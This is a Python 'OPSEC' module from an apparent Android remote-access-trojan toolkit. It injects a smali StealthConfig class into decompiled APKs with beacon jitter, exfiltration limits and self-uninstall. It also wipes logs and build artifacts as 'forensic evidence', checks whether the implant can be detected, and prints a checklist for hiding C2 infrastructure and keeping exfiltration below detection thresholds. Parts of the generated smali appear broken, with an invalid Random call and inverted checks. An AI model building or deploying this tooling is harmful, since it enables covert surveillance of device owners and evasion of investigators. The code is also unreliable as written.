#!/usr/bin/env python3
"""OPSEC Module.

Provides TTL-based auto-destruct, stealth mode configuration,
evidence cleanup, and operational security management.

Usage:
    python opsec.py --mode cleanup --work-dir /tmp/apk_instrument_*
    python opsec.py --mode check --apk-dir ./decompiled
"""

import argparse
import glob
import os
import shutil
import sys
import time
from pathlib import Path
from typing import Optional


class StealthConfig:
    """Configure stealth parameters for the agent."""

    DEFAULT_CONFIG = {
        "ttl_hours": 72,
        "max_exfil_bytes": 50 * 1024 * 1024,
        "beacon_jitter_ms": 5000,
        "min_beacon_ms": 30000,
        "max_beacon_ms": 120000,
        "auto_destruct": True,
        "stealth_logging": True,
        "log_level": "error",
        "disable_frida_writes": True,
        "max_log_size_bytes": 1024 * 1024,
        "rotate_logs": True,
        "self_remove_on_detection": True,
        "encrypt_comms": True,
        "dead_drop_enabled": False,
        "max_sessions": 1,
        "session_timeout_hours": 24,
    }

    def __init__(self, config: Optional[dict] = None):
        self.config = {**self.DEFAULT_CONFIG, **(config or {})}

    def generate_smali_config(self) -> str:
        ttl_ms = self.config["ttl_hours"] * 3600 * 1000
        max_exfil = self.config["max_exfil_bytes"]
        min_beacon = self.config["min_beacon_ms"]
        max_beacon = self.config["max_beacon_ms"]

        return f""".class public Lcom/rat/opsec/StealthConfig;
.super Ljava/lang/Object;

.field private static final TTL_MS:J = {ttl_ms}L
.field private static final MAX_EXFIL_BYTES:I = {max_exfil}
.field private static final MIN_BEACON_MS:I = {min_beacon}
.field private static final MAX_BEACON_MS:I = {max_beacon}
.field private static final AUTO_DESTRUCT:Z = {"1" if self.config["auto_destruct"] else "0"}
.field private static final STEALTH_LOGGING:Z = {"1" if self.config["stealth_logging"] else "0"}

.field private static startTime:J
.field private static exfilBytes:I

.method static constructor <clinit>()V
    .registers 2
    invoke-static {{}}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v0
    sput-wide v0, Lcom/rat/opsec/StealthConfig;->startTime:J
    const/4 v0, 0x0
    sput v0, Lcom/rat/opsec/StealthConfig;->exfilBytes:I
    return-void
.end method

.method public static isExpired()Z
    .registers 6
    invoke-static {{}}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v0
    sget-wide v2, Lcom/rat/opsec/StealthConfig;->startTime:J
    sub-long/2addr v0, v2
    sget-wide v2, Lcom/rat/opsec/StealthConfig;->TTL_MS:J
    cmp-long v4, v0, v2
    if-gez v4, :not_expired
    const/4 v0, 0x1
    return v0

    :not_expired
    const/4 v0, 0x0
    return v0
.end method

.method public static canExfil(I)Z
    .registers 4
    sget v0, Lcom/rat/opsec/StealthConfig;->exfilBytes:I
    add-int/2addr v0, p0
    sget v1, Lcom/rat/opsec/StealthConfig;->MAX_EXFIL_BYTES:I
    if-le v0, v1, :limit
    const/4 v0, 0x1
    return v0

    :limit
    const/4 v0, 0x0
    return v0
.end method

.method public static getBeaconDelay()I
    .registers 3
    invoke-static {{}}, Ljava/util/Random;-><init>()V
    move-result-object v0
    sget v1, Lcom/rat/opsec/StealthConfig;->MIN_BEACON_MS:I
    sget v2, Lcom/rat/opsec/StealthConfig;->MAX_BEACON_MS:I
    sub-int/2addr v2, v1
    invoke-virtual {{v0, v2}}, Ljava/util/Random;->nextInt(I)I
    move-result v0
    add-int/2addr v0, v1
    return v0
.end method

.method public static selfDestruct(Landroid/content/Context;)V
    .registers 4
    sget-boolean v0, Lcom/rat/opsec/StealthConfig;->AUTO_DESTRUCT:Z
    if-eqz v0, :end

    invoke-virtual {{p0}}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v0

    new-instance v1, Landroid/content/Intent;
    const-string v2, "android.intent.action.DELETE"
    invoke-direct {{v1, v2}}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
    const-string v3, "package:"
    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v2, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0

    invoke-static {{v0}}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v0
    invoke-virtual {{v1, v0}}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v0, 0x10000000
    invoke-virtual {{v1, v0}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {{p0, v1}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :end
    return-void
.end method
"""


class EvidenceCleanup:
    """Clean up forensic artifacts from the build environment."""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.cleaned = 0

    def _log(self, msg: str):
        if self.verbose:
            print(f"  [cleanup] {msg}")

    def clean_temp_dirs(self, pattern: str = "/tmp/apk_instrument_*"):
        for path in glob.glob(pattern):
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
                self._log(f"Removed temp dir: {path}")
                self.cleaned += 1

    def clean_logs(self, log_dir: str = "./logs"):
        if os.path.isdir(log_dir):
            for f in os.listdir(log_dir):
                if f.endswith(".log"):
                    fpath = os.path.join(log_dir, f)
                    os.remove(fpath)
                    self._log(f"Removed log: {fpath}")
                    self.cleaned += 1

    def clean_results(self, results_dir: str = "./results"):
        if os.path.isdir(results_dir):
            for root, dirs, files in os.walk(results_dir):
                for f in files:
                    if f.endswith((".json", ".jsonl", ".log", ".db")):
                        fpath = os.path.join(root, f)
                        os.remove(fpath)
                        self._log(f"Removed result: {fpath}")
                        self.cleaned += 1

    def clean_pycache(self, root_dir: str = "."):
        for root, dirs, files in os.walk(root_dir):
            if "__pycache__" in dirs:
                pycache = os.path.join(root, "__pycache__")
                shutil.rmtree(pycache, ignore_errors=True)
                self._log(f"Removed __pycache__: {pycache}")
                self.cleaned += 1

    def clean_output(self, output_dir: str = "./output"):
        if os.path.isdir(output_dir):
            shutil.rmtree(output_dir, ignore_errors=True)
            self._log(f"Removed output dir: {output_dir}")
            self.cleaned += 1

    def clean_all(self, work_dirs: Optional[list] = None):
        print("[*] Cleaning forensic artifacts...")
        self.clean_temp_dirs()
        self.clean_logs()
        self.clean_pycache()
        if work_dirs:
            for d in work_dirs:
                if os.path.isdir(d):
                    shutil.rmtree(d, ignore_errors=True)
                    self._log(f"Removed work dir: {d}")
                    self.cleaned += 1
        print(f"[+] Cleaned {self.cleaned} artifacts")


class OPSECManager:
    """Main OPSEC orchestrator."""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose

    def inject_stealth_config(self, decompiled_dir: str, config: Optional[dict] = None):
        print("[*] Injecting stealth configuration...")
        stealth = StealthConfig(config)
        smali = stealth.generate_smali_config()

        for entry in os.listdir(decompiled_dir):
            full = os.path.join(decompiled_dir, entry)
            if os.path.isdir(full) and entry.startswith("smali"):
                pkg_dir = os.path.join(full, "com", "rat", "opsec")
                os.makedirs(pkg_dir, exist_ok=True)
                with open(os.path.join(pkg_dir, "StealthConfig.smali"), "w") as f:
                    f.write(smali)
                print(f"    Injected StealthConfig.smali into {entry}/")
                break

    def check_apk_stealth(self, decompiled_dir: str) -> dict:
        print("[*] Checking APK stealth properties...")
        issues = []

        manifest = os.path.join(decompiled_dir, "AndroidManifest.xml")
        if os.path.exists(manifest):
            with open(manifest, "r") as f:
                content = f.read()

            if 'android:debuggable="true"' in content:
                issues.append("DEBUGGABLE flag is set")

            if "android.permission.READ_LOGS" in content:
                issues.append("READ_LOGS permission present")

            if 'android:allowBackup="true"' in content:
                issues.append("allowBackup is enabled")

            if "android.permission.INTERNET" not in content:
                issues.append("No INTERNET permission (may limit comms)")

        for root, dirs, files in os.walk(decompiled_dir):
            for f in files:
                if f.endswith(".smali"):
                    fpath = os.path.join(root, f)
                    with open(fpath, "r") as fh:
                        content = fh.read()
                    if "frida" in content.lower():
                        issues.append(f"Frida reference in {f}")
                    if "debug" in content.lower() and "Log.d" in content:
                        issues.append(f"Debug logging in {f}")

        if issues:
            print(f"    [!] Found {len(issues)} stealth issues:")
            for issue in issues:
                print(f"        - {issue}")
        else:
            print("    [+] No obvious stealth issues found")

        return {"issues": issues, "clean": len(issues) == 0}

    def generate_opsec_checklist(self) -> str:
        return """
OPSEC Checklist for Red Team Operations:
==========================================

Pre-Operation:
  [ ] Verify C2 server is behind VPN/proxy
  [ ] Generate unique signing keys for this operation
  [ ] Verify no ties to known infrastructure
  [ ] Check target's security monitoring capabilities
  [ ] Test instrumented APK against detection tools

During Operation:
  [ ] Monitor agent heartbeat frequency
  [ ] Rotate C2 endpoints if compromised
  [ ] Use covert channels if primary C2 is blocked
  [ ] Keep exfil volume below detection thresholds
  [ ] Use jitter on all communications

Post-Operation:
  [ ] Trigger agent self-destruct
  [ ] Clean all build artifacts
  [ ] Remove temporary signing keys
  [ ] Wipe local logs
  [ ] Verify C2 server cleanup
  [ ] Archive operation data securely
"""


def main():
    parser = argparse.ArgumentParser(description="OPSEC Manager")
    parser.add_argument("--mode", choices=["cleanup", "stealth", "check", "checklist"],
                        default="checklist")
    parser.add_argument("--apk-dir", help="Path to decompiled APK directory")
    parser.add_argument("--work-dir", help="Working directory to clean")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    manager = OPSECManager(verbose=args.verbose)

    if args.mode == "cleanup":
        cleanup = EvidenceCleanup(verbose=args.verbose)
        dirs = [args.work_dir] if args.work_dir else None
        cleanup.clean_all(dirs)

    elif args.mode == "stealth":
        if not args.apk_dir:
            print("[!] --apk-dir required for stealth mode")
            sys.exit(1)
        manager.inject_stealth_config(args.apk_dir)

    elif args.mode == "check":
        if not args.apk_dir:
            print("[!] --apk-dir required for check mode")
            sys.exit(1)
        manager.check_apk_stealth(args.apk_dir)

    elif args.mode == "checklist":
        print(manager.generate_opsec_checklist())


if __name__ == "__main__":
    main()
